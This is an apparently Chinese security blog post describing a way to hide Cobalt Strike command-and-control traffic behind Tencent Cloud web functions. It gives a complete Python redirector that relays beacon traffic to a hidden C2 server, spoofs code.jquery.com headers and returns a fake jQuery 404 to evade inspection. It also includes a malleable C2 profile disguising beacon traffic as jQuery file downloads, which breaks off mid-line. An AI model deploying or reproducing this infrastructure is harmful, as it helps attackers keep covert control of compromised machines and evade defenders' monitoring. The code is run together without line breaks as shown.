---
title: 告别常规API网关转发：云函数隐匿 C2 新思路
url: https://mp.weixin.qq.com/s/PdEEwTLiSOw1DHc1iqGoyg
source: Doonsec's feed
date: 2026-04-13
fetch_date: 2026-04-14T04:40:04.157464
---

# 告别常规API网关转发：云函数隐匿 C2 新思路

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/01SsxdBbUORibk3bc3BAV0f29ahTlvkszSzv9GiaZEy7ShgIldwOOnDjt5V2vDQClnmmjsrpW4ngNcHuCKSytC1YkFQIBjK7R2yciaURgO4WH8/0?wx_fmt=jpeg)

# 告别常规API网关转发：云函数隐匿 C2 新思路

原创

心碎小鹤
心碎小鹤

心碎小鹤Sec

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

**“** 二十几岁的矛盾，在于一边渴望探索自己无限的可能性，一边又急于确定此后人生唯一的确定性。”

网上有很多隐藏C2的教程和技术文章，主要就是CDN，域前置还有另一个云函数这三种方法。CDN和域前置目前面临一些问题就是云厂商（如 Cloudflare, Amazon）通过技术手段不再允许跨租户的 Host 转发，“域前置”逐渐失效，但也有一些大佬新的域前置思路也是非常牛逼的。在这个背景之下，云函数的优势就比较大，主要有以下几个优点

**高信誉域名：**使用云厂商提供的默认域名（如 `azurewebsites.net`, `tencentcs.com`），天生具备白名单优势。

**动态 IP：**云函数的出口 IP 通常是动态的资源池，难以通过封锁单一 IP 进行阻断。

**HTTPS 加密：**默认提供可信的 SSL 证书，流量加密，规避流量审计。

**低成本：**按调用次数收费，几乎零成本维护。

但大多数师傅可能会有一个疑问，之前云函数通过API网关触发，也就是利用API gataway来封装流量，但很多云厂商都已经不在提供API网关产品，但今天我跟大家介绍的是另一种云函数方法，比通过API网关触发的优势更大，并且我目前没有在任何平台看到过相关文章（如果师傅们有相关链接资料，请私信我去学习一下），所以在一定程度我觉得应该是全网首发（这也得益于云厂商的技术迭代）。话不多说，直接开始！

01

—

下面以腾讯云为例

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/01SsxdBbUOThOo8FIYXl347oZtjotnuVPO9r2qqibjnfy4CJGiazxNu6q6rLNlgnfbFDOiafDNJKmtxJDkckatENFzibOkr4O8SL9YLXS5NnibOk/640?wx_fmt=jpeg&from=appmsg)

根据自己需求去选择对应的类型，一般选web函数

![](https://mmbiz.qpic.cn/mmbiz_jpg/01SsxdBbUOQziabll5IyZGdEYsoiaZG66icrl44kTgzkAtvvvQCDejdziad3nibvDhjdlTnjB8wzYOtn9lM2M4C6ZSTMUDypK8mgdcycV5IyKYYg/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/01SsxdBbUOSJjODxZ9Sic1gaWqiaXS9vBMVK4QUNJcMHzsSjz1mFibdNhUWsp3APiaibIibibPFnicpB7ZicsY0EibAHiclia5Jp1Dsiands9OD0J0LxX6Ek/640?wx_fmt=jpeg&from=appmsg)

这里给一个我自己用的脚本

```
-*- coding: utf8 -*-import urllib.requestimport urllib.parseimport sslimport base64import traceback#真实C2地址（格式：https://IP:端口）REAL_C2_URL = 'https://x.x.x.x:xxx'#伪装的合法Host（匹配Profile的Referer，固定为jQuery官方域名）FAKE_HOST = 'code.jquery.com'#允许的请求路径（必须和Profile里的uri完全一致）ALLOWED_URIS = ['/jquery-3.3.1.slim.min.js','/jquery-3.3.2.slim.min.js','/jquery-3.3.1.min.js','/jquery-3.3.2.min.js']==============================================================================def main_handler(event, context):try:# 1. 解析URL函数的请求参数path = event.get('path', '/')method = event.get('httpMethod', 'GET')headers = event.get('headers', {}) or {}  # 兼容空headersquery_params = event.get('queryString', {}) or {}is_base64 = event.get('isBase64Encoded', False)req_body = event.get('body', '')# 2. 路径白名单校验：非jQuery路径返回伪装404，强化隐蔽性#if path not in ALLOWED_URIS:#  return fake_jquery_404()# 3. 构造转发到真实C2的URLtarget_url = f"{REAL_C2_URL.rstrip('/')}{path}"if query_params:target_url += "?" + urllib.parse.urlencode(query_params)# 4. 处理请求体forward_body = Noneif req_body:if is_base64:forward_body = base64.b64decode(req_body)else:forward_body = req_body.encode('utf-8')# 5. 清洗+伪装请求头forward_headers = {}exclude_headers = ['x-scf-request-id', 'x-forwarded-for', 'via', 'x-real-ip', 'connection']for k, v in headers.items():k_lower = k.lower()if k_lower in exclude_headers:continue# 强制替换Host为伪装域名，其他头保留（如Cookie里的__cfduid）forward_headers[k] = FAKE_HOST if k_lower == 'host' else v# 补全Profile定义的伪装头forward_headers.setdefault('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0')forward_headers.setdefault('Referer', 'http://code.jquery.com/')forward_headers.setdefault('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')forward_headers.setdefault('Accept-Language', 'en-US,en;q=0.5')forward_headers.setdefault('Cache-Control', 'max-age=0, no-cache')forward_headers.setdefault('Pragma', 'no-cache')forward_headers.setdefault('Connection', 'Keep-Alive')forward_headers.setdefault('Keep-Alive', 'timeout=10, max=100')# 6. 配置SSL上下文（忽略C2自签名证书）ctx = ssl.create_default_context()ctx.check_hostname = Falsectx.verify_mode = ssl.CERT_NONE# 7. 构造转发请求（适配CS的长连接超时）req = urllib.request.Request(target_url,data=forward_body,headers=forward_headers,method=method)# 8. 转发请求到真实C2并获取响应with urllib.request.urlopen(req, context=ctx, timeout=30) as response:resp_content = response.read()resp_status = response.getcode()resp_headers = dict(response.info())# 9. 清洗响应头（剔除冲突头，伪装成CDN响应）safe_resp_headers = {}exclude_resp_headers = ['content-length', 'connection', 'transfer-encoding', 'x-powered-by']for k, v in resp_headers.items():k_lower = k.lower()if k_lower in exclude_resp_headers:continue# 强制替换Server头为Profile定义的CDN标识safe_resp_headers[k] = 'NetDNA-cache/2.2' if k_lower == 'server' else v# 补全伪装响应头safe_resp_headers.setdefault('Content-Type', 'application/*; charset=utf-8')safe_resp_headers.setdefault('Cache-Control', 'max-age=0, no-cache')safe_resp_headers.setdefault('Pragma', 'no-cache')safe_resp_headers.setdefault('Keep-Alive', 'timeout=10, max=100')safe_resp_headers.setdefault('Connection', 'Keep-Alive')# 10. 返回Base64编码的响应return {"isBase64Encoded": True,"statusCode": resp_status,"headers": safe_resp_headers,"body": base64.b64encode(resp_content).decode('utf-8')}except Exception:# 异常时返回jQuery风格404，避免暴露C2return fake_jquery_404()伪装jQuery官网风格的404响应（强化隐蔽性）def fake_jquery_404():fake_html = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>404 Not Found - jQuery CDN</title><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>body { font-family: Arial, sans-serif; margin: 50px; background: #f5f5f5; }.container { max-width: 700px; margin: 0 auto; padding: 20px; background: #fff; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }h1 { color: #dc3545; font-size: 28px; margin-bottom: 20px; }p { color: #6c757d; font-size: 16px; line-height: 1.5; }a { color: #0d6efd; text-decoration: none; }a:hover { text-decoration: underline; }.cdn-note { margin-top: 20px; padding: 10px; background: #f8f9fa; border-left: 3px solid #0d6efd; }</style></head><body><div class="container"><h1>404 - File Not Found</h1><p>The requested jQuery file could not be found on the CDN server.</p><p>Please check the file path or visit the <a href="http://code.jquery.com/">official jQuery CDN</a> for valid file names.</p><div class="cdn-note"><strong>Valid Examples:</strong><br>/jquery-3.7.1.min.js | /jquery-3.6.0.slim.min.js</div></div></body></html>"""return {"isBase64Encoded": False,"statusCode": 404,"headers": {"Content-Type": "text/html; charset=utf-8","Server": "NetDNA-cache/2.2","Cache-Control": "max-age=0, no-cache","Connection": "Keep-Alive"},"body": fake_html}
```

进入创建好的函数

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/01SsxdBbUOTIHSJTibk2eibTNtfMQJZwAYeAgfsQZ0HzMNGaoYp31yaMXh2YTz1OSeyXz13tLfpReAb32qyNHrWNd3NHP9VvCt9XsNasaRXa4/640?wx_fmt=jpeg&from=appmsg)

在这里修改代码，完成后到下面点击部署确认部署成功

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/01SsxdBbUOSiaRaDN8Gq8ElyFCzrf4BywMK6xDIVN4zjIhjc1cf5FwqdRG4YeyoXWicicyw6HGicj5yhDzibr4TyOtoTLYdkfvibeqyBpVP8jbEcQ/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/01SsxdBbUOS66ggysOP7XtUiboYtw3jRXrhbYQrSerZB1IZRD4iasNheUeQwlc5jY0CIQEQ6jLmz3nJC5nG8T8lhcE14XlswVXN5eXUUo19dQ/640?wx_fmt=jpeg&from=appmsg)

然后来到函数url这里就可以获取到公网和内网域名，这就是后面在CS监听host头

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/01SsxdBbUOQN5VJLibpW4E2W01BNCHQQUm4zktoNrUQNjteGAS9Prh8Eu4MYUe1HpYbVme17o6trfVXJfmm1DRmicy6ewTu8bxctt8zeM4w8o/640?wx_fmt=jpeg&from=appmsg)

然后创建一个profile文件写入配置，这里用一个伪装jQuery流量的profile文件

```
set sample_name "CobaltStrike jQuery CDN Profile";# 基础通信配置set sleeptime "20000";    # 基础休眠20秒set jitter "37";          # 抖动37%set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0";# HTTP Stager 配置http-stager {    set uri_x86 "/jquery-3.3.1.slim.min.js";    set uri_x64 "/jquery-3.3.2.slim.min.js";    server {        header "Server" "NetDNA-cache/2.2";        header "Cache-Control" "max-age=0, no-cache";        header "Pragma" "no-cache";        header "Connection" "keep-alive";        header "Content-Type" "application/javascript; charset=utf-8";        # jQuery 伪装头部        prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */";        prepend "!function(e,t){\"use strict\";\"object\"==typeof module&&\"object\"==typeof module.exports?module.exports=e.doc...